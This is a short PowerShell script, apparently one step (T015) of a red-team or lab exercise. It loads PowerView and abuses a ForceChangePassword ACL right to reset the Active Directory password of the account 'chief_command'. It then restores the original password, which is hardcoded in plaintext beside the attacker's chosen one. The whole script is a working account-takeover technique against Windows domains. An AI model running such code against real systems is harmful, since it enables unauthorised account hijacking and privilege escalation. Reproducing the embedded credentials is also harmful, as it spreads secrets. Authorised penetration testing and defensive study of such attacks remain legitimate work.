[CmdletBinding()]
param()
$ErrorActionPreference = "Stop"
$pv = "C:\Tools\cadre-attack\PowerView.ps1"
if (-not (Test-Path -LiteralPath $pv)) { throw "PowerView.ps1 not found" }
. $pv
$t = "chief_command"
$secNew = ConvertTo-SecureString "RedStrike_T015!" -AsPlainText -Force
$secOld = ConvertTo-SecureString "C0mm@nd_Ch1ef!" -AsPlainText -Force
Set-DomainUserPassword -Identity $t -AccountPassword $secNew -Verbose
Set-DomainUserPassword -Identity $t -AccountPassword $secOld -Verbose
Write-Output "T015_OK: ACE#7 ForceChangePassword on chief_command then restored original"
